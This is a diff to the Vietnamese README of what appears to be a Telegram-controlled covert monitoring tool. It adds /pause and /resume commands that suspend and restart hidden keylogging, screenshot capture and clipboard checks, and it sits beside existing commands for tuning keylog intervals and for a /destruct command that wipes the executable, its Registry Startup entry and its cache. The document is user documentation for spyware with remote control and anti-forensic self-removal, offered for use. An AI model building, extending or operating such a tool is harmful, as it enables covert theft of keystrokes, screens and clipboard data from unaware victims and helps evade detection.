@@ -84,6 +84,8 @@ Bạn có thể gửi lệnh trực tiếp hoặc bấm qua Menu ở góc trái 
 | `/clear` | Dọn dẹp sạch sẽ các ảnh màn hình tạm thời, outbox lỗi và làm trống bộ đệm phím bấm. | `/clear` hoặc `/clear @Tên_Máy` |
 | `/name` | Xem tên máy hiện tại hoặc đổi tên đại diện (Alias) cho máy. | `/name` hoặc `/name <tên_mới> @Tên_Cũ` |
 | `/interval` | Xem hoặc thay đổi thời gian định kỳ chụp màn hình (`screenshot`), gửi logs (`keylog`), quét thử lại (`outbox`). | `/interval <loại> <giây> @Tên_Máy` |
+| `/pause` | Tạm dừng các hoạt động giám sát ngầm (keylog, chụp màn hình, kiểm tra clipboard) nhưng vẫn giữ kết nối nhận lệnh Telegram. | `/pause` hoặc `/pause @Tên_Máy` |
+| `/resume` | Tiếp tục (chạy lại) các hoạt động giám sát ngầm đã bị tạm dừng. | `/resume` hoặc `/resume @Tên_Máy` |
 | `/destruct` | Kích hoạt tự hủy tool, xóa sạch file chạy, Registry Startup và thư mục Cache lưu trữ. | `/destruct` hoặc `/destruct @Tên_Máy` |
 | `/help` | Hiển thị bảng hướng dẫn sử dụng chi tiết này. | `/help` hoặc `/help @Tên_Máy` |
 
